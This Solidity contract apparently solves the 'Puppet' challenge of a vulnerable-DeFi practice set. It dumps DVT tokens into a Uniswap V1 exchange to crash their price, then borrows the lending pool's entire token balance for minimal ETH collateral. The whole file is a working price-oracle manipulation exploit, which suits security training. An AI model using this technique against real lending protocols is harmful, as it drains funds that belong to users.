// SPDX-License-Identifier: UNLICENSED
pragma solidity =0.8.25;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IUniswapV1Exchange} from "../IUniswapV1Exchange.sol";

interface IPuppet {
    function calculateDepositRequired(uint256 amount) external returns (uint256);
    function borrow(uint256 amount, address recipient) external payable;
}

contract PuppetAttack is Ownable {
    IUniswapV1Exchange private immutable _uni;
    IPuppet private immutable _pool;
    IERC20 private immutable _token;
    address private immutable _recovery;

    constructor(address uni, address pool, address token, address recovery) payable Ownable(msg.sender) {
        _uni = IUniswapV1Exchange(uni);
        _pool = IPuppet(pool);
        _token = IERC20(token);
        _recovery = recovery;
    }

    function attack() external onlyOwner {
        // TODO 1. transfer DVT tokens from the owner to the contract
        uint256 tokenAmount = _token.balanceOf(owner());
        require(_token.transferFrom(owner(), address(this), tokenAmount), "token transfer failed");

        // TODO 2. swap DVT token for ETH to decrease the price of DVT in terms of ETH
        _token.approve(address(_uni), tokenAmount);
        _uni.tokenToEthSwapInput(tokenAmount, 1, block.timestamp * 2);

        // TODO 3. borrow all the DVT tokens from the puppet and send it to the recovery address
        uint256 borrowTokenAmount = _token.balanceOf(address(_pool));
        uint256 ethAmount = _pool.calculateDepositRequired(borrowTokenAmount);
        _pool.borrow{value: ethAmount}(borrowTokenAmount, _recovery);
    }

    receive() external payable {}
}
